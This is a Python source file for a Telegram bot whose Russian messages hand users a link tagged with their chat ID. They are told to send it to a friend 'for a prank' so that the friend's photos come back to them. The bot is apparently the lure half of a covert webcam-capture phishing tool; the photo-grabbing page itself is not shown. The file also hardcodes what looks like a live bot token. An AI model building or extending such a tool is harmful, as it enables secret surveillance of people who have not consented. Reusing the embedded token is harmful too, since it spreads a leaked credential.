import telebot

# Replace with your bot token
BOT_TOKEN = '8420275180:AAGCmlDkk-5h_7GI_dkuoAf_iwITnaP6aSw'

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Привет! Напиши /link чтобы получить ссылку для прикола.")

@bot.message_handler(commands=['link'])
def send_link(message):
    chat_id = message.chat.id
    # Replace with your hosted site URL, for local testing use localhost
    site_url = 'http://localhost:8000'  # Change to your hosted URL
    link = f'{site_url}?ref={chat_id}'
    bot.send_message(chat_id, f'Вот ссылка для прикола: {link}\nОтправь её другу, и фото придут тебе!')

bot.polling()